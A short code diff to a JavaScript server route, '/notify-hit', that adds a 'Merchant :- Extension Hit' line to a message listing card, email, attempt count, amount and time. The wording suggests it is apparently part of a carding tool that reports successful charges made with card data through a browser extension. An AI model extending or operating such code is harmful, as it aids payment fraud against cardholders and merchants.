@@ -169,6 +169,7 @@ router.post('/notify-hit', async (req, res) => {
     `─────────────────\n\n` +
     `Card :- ${cardDisplay}\n` +
     `Email :- ${emailDisplay}\n` +
+    `Merchant :- Extension Hit\n` +
     `Attempt :- ${attempts ?? '—'}\n` +
     `Amount :- ${amtFormatted}\n` +
     `Time :- ${timeDisplay}\n\n` +
